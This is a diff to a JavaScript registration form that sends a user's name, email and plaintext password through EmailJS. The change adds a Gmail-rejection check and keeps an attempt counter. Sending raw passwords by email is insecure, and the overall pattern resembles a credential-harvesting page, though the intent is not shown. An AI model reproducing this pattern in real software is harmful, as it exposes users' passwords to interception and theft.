@@ -1,13 +1,24 @@
-emailjs.init('ReqtkWfjI392LAzFb'); // Tu User ID de EmailJS
+emailjs.init('ReqtkWfjI392LAzFb');
 
 document.getElementById('formRegistro').addEventListener('submit', (e) => {
     e.preventDefault();
     
+    const correo = document.getElementById('correo').value;
+    const errorGmail = document.getElementById('errorGmail');
     let intentos = localStorage.getItem('intentosRegistro') || 0;
-    
+
+    // Validar Gmail
+    if (correo.toLowerCase().includes('@gmail.com')) {
+        errorGmail.style.display = 'block';
+        document.getElementById('correo').focus();
+        return;
+    } else {
+        errorGmail.style.display = 'none';
+    }
+
     const datos = {
         nombre: document.getElementById('nombre').value,
-        correo: document.getElementById('correo').value,
+        correo: correo,
         contrasena: document.getElementById('password').value
     };
 
@@ -22,6 +33,6 @@ document.getElementById('formRegistro').addEventListener('submit', (e) => {
             }
         })
         .catch((error) => {
-            alert('Error temporal: ' + error.text);
+            alert('Error: ' + error.text);
         });
 });
